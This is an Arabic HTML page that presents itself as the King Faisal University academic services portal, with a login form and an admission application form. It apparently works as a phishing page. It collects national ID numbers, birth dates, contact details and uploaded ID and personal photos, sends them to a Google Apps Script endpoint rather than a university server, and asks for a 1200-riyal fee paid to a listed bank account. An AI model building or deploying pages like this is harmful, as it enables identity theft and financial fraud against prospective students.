<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>جامعة الملك فيصل – بوابة الخدمات الأكاديمية</title>
<link rel="icon" type="image/png" href="kfu_logo.png">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<style>
body {
  font-family: "Tajawal", sans-serif;
  margin: 0;
  background: #f2f2f2;
  color: #222;
}

/* صفحة الدخول */
.login-container {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  background: linear-gradient(to bottom, #0b6b44, #084d32);
  color: #fff;
  text-align: center;
}

.login-header .logo-circle {
  background: #fff;
  border-radius: 50%;
  padding: 10px;
  width: 100px;
  height: 100px;
  margin: 0 auto;
}
.login-header img {
  width: 100%;
  height: 100%;
  object-fit: contain;
}
.login-header h1 {
  margin-top: 15px;
  font-size: 28px;
}
.login-header p {
  font-size: 16px;
  opacity: 0.9;
}

.login-form {
  background: #fff;
  color: #222;
  border-radius: 12px;
  padding: 25px;
  width: 320px;
  margin-top: 25px;
}
.login-form h2 {
  margin-bottom: 20px;
  color: #0b6b44;
}
.form-group {
  margin-bottom: 15px;
  text-align: right;
}
.input-group {
  display: flex;
  align-items: center;
  border: 1px solid #ccc;
  border-radius: 8px;
  padding: 8px;
}
.input-group i {
  margin-left: 8px;
  color: #777;
}
.input-group input {
  border: none;
  outline: none;
  flex: 1;
}
.login-btn {
  width: 100%;
  background: #0b6b44;
  color: #fff;
  border: none;
  border-radius: 8px;
  padding: 10px;
  font-size: 16px;
  cursor: pointer;
}
.quick-access {
  margin-top: 25px;
}
.quick-link {
  background: #084d32;
  color: #fff;
  padding: 10px;
  display: inline-flex;
  align-items: center;
  border-radius: 8px;
  text-decoration: none;
  gap: 8px;
}

/* نموذج التسجيل */
.container {
  display: none;
  background: #fff;
  padding: 25px;
  max-width: 900px;
  margin: 30px auto;
  border-radius: 12px;
  box-shadow: 0 3px 10px rgba(0,0,0,0.1);
}
header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  flex-wrap: wrap;
  border-bottom: 2px solid #0b6b44;
  padding-bottom: 10px;
  margin-bottom: 20px;
}
header .brand {
  display: flex;
  align-items: center;
  gap: 15px;
}
header .logo {
  background: #0b6b44;
  color: #fff;
  font-weight: bold;
  padding: 12px 20px;
  border-radius: 10px;
  font-size: 22px;
}
header h1 {
  margin: 0;
  color: #0b6b44;
}
.subtitle {
  margin: 3px 0;
  color: #666;
  font-size: 14px;
}
.grid2 {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 20px;
}
.grid2 label {
  font-weight: bold;
  color: #0b6b44;
}
.grid2 input, .grid2 select {
  width: 100%;
  padding: 8px;
  border-radius: 6px;
  border: 1px solid #ccc;
  margin-bottom: 10px;
}
.section-title {
  margin-top: 20px;
  font-size: 18px;
  color: #0b6b44;
  font-weight: bold;
}
.files-row {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 20px;
  margin-top: 10px;
}
.files-row label {
  font-weight: bold;
  color: #0b6b44;
}
.files-row input {
  width: 100%;
  padding: 8px;
  border-radius: 6px;
  border: 1px solid #ccc;
}
.submit-area {
  margin-top: 25px;
  text-align: center;
}
.btn {
  background: #0b6b44;
  color: #fff;
  border: none;
  padding: 10px 18px;
  border-radius: 8px;
  cursor: pointer;
  font-size: 15px;
  margin: 5px;
}
.cancel {
  background: #777;
}
</style>
</head>

<body>

<!-- ✅ صفحة تسجيل الدخول -->
<div class="login-container" id="loginPage">
  <header class="login-header">
    <div class="university-logo">
      <div class="logo-circle">
        <img src="kfu_logo.png" alt="شعار جامعة الملك فيصل">
      </div>
      <h1>جامعة الملك فيصل</h1>
      <p>بوابة الخدمات الأكاديمية</p>
    </div>
  </header>

  <div class="login-form">
    <h2>تسجيل الدخول</h2>
    <form>
      <div class="form-group">
        <label>اسم المستخدم أو الإيميل</label>
        <div class="input-group">
          <i class="fas fa-user"></i>
          <input type="text" required>
        </div>
      </div>

      <div class="form-group">
        <label>كلمة المرور</label>
        <div class="input-group">
          <i class="fas fa-lock"></i>
          <input type="password" required>
        </div>
      </div>

      <button type="submit" class="login-btn">
        <i class="fas fa-sign-in-alt"></i>
        <span>تسجيل الدخول</span>
      </button>
    </form>

    <div class="quick-access">
      <h3>وصول سريع</h3>
      <a href="#" class="quick-link" onclick="showForm()">
        <i class="fas fa-user-graduate"></i>
        <span>تقديم طلب جديد</span>
      </a>
    </div>
  </div>
</div>

<!-- ✅ نموذج التسجيل -->
<div class="container" id="registrationForm">
  <form id="registrationFormForm"
        action="https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec"
        method="POST" enctype="multipart/form-data">

    <header>
      <div class="brand">
        <div class="logo">KFU</div>
        <div>
          <h1>نموذج التسجيل - جامعة الملك فيصل</h1>
          <p class="subtitle">يرجى تعبئة جميع الحقول بدقة وإرفاق الملفات المطلوبة.</p>
        </div>
      </div>
      <div>
        <div class="bank-name">رقم الحساب:</div>
        <div style="font-weight:800;color:#0b6b44">SA1980000857608010276380</div>
        <div style="color:#444">الرسوم: 1200 ريال</div>
      </div>
    </header>

    <div class="grid2">
      <div>
        <label>الاسم الكامل *</label>
        <input type="text" name="fullName" required>

        <label>الجنس *</label>
        <select name="gender" required>
          <option value="">اختر...</option>
          <option>ذكر</option>
          <option>أنثى</option>
        </select>

        <label>الجنسية *</label>
        <select name="nationality" required>
          <option value="">اختر...</option>
          <option>السعودية</option>
          <option>اليمن</option>
          <option>مصر</option>
          <option>العراق</option>
        </select>

        <label>رقم الهوية *</label>
        <input type="text" name="idNumber" required>

        <label>تاريخ الميلاد *</label>
        <input type="date" name="birthDate" required>

        <label>رقم الجوال *</label>
        <input type="tel" name="phone" required>

        <label>البريد الإلكتروني *</label>
        <input type="email" name="email" required>
      </div>

      <div>
        <label>المؤهل السابق *</label>
        <select name="prevDegree" required>
          <option value="">اختر...</option>
          <option>ثانوي</option>
          <option>دبلوم</option>
          <option>بكالوريوس</option>
        </select>

        <label>التخصص المطلوب *</label>
        <input type="text" name="desiredMajor" required>

        <label>نوع الدراسة *</label>
        <select name="studyType" required>
          <option value="">اختر...</option>
          <option>انتظام</option>
          <option>انتساب</option>
          <option>تعليم عن بعد</option>
        </select>

        <label>الكلية *</label>
        <select name="faculty" required>
          <option value="">اختر...</option>
          <option>كلية الطب</option>
          <option>كلية العلوم</option>
          <option>كلية الحاسبات</option>
        </select>
      </div>
    </div>

    <div class="section-title">المرفقات</div>
    <div class="files-row">
      <div>
        <label>صورة الهوية *</label>
        <input type="file" name="fileId" required>
      </div>
      <div>
        <label>الشهادة *</label>
        <input type="file" name="fileCertificate" required>
      </div>
    </div>

    <div class="files-row">
      <div>
        <label>صورة شخصية *</label>
        <input type="file" name="filePhoto" required>
      </div>
      <div>
        <label>إيصال الدفع (اختياري)</label>
        <input type="file" name="fileReceipt">
      </div>
    </div>

    <div class="submit-area">
      <button type="submit" class="btn">إرسال الطلب</button>
      <button type="button" class="btn cancel" onclick="backToLogin()">رجوع</button>
    </div>
  </form>
</div>

<script>
function showForm(){
  document.getElementById("loginPage").style.display = "none";
  document.getElementById("registrationForm").style.display = "block";
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function backToLogin(){
  document.getElementById("registrationForm").style.display = "none";
  document.getElementById("loginPage").style.display = "flex";
  window.scrollTo({ top: 0, behavior: "smooth" });
}

document.getElementById("registrationFormForm").addEventListener("submit", e=>{
  e.preventDefault();
  let fd = new FormData(e.target);
  fetch(e.target.action, {method:"POST", body:fd})
  .then(()=>{
    alert("✅ تم إرسال الطلب بنجاح");
    e.target.reset();
  })
  .catch(()=>{
    alert("❌ حدث خطأ! حاول مرة أخرى");
  });
});
</script>

</body>
</html>
